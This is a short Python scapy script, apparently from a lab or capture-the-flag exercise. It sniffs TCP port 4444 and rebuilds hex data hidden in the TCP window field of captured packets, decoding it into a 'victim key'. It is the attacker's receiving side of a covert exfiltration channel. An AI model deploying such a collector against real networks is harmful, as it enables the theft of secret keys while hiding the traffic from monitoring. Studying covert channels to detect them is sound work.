#!/usr/bin/env python3
from scapy import interfaces
from scapy.all import *


def reconstruct_hex_string(packets):
    reconstructed_hex_string = ""
    for p in packets:
        window_hex = str(format(p.window, "04x"))
        w1 = window_hex[:2]
        w2 = window_hex[2:]
        final = ""
        if w1 != "00":
            final += w1
        final += w2
        reconstructed_hex_string += final
    return reconstructed_hex_string


def deser_data(data):
    bytes_obj = bytes.fromhex(data)
    return bytes_obj.decode("ASCII")


if __name__ == "__main__":
    packets = sniff(filter="tcp port 4444", timeout=80, iface="eth0")

    reconstructed_hex_string = reconstruct_hex_string(packets)

    reconstructed_victim_key = deser_data(reconstructed_hex_string)

    print(reconstructed_hex_string)

    reconstructed_hex_string = reconstruct_hex_string(packets)
    reconstructed_victim_key = deser_data(reconstructed_hex_string)
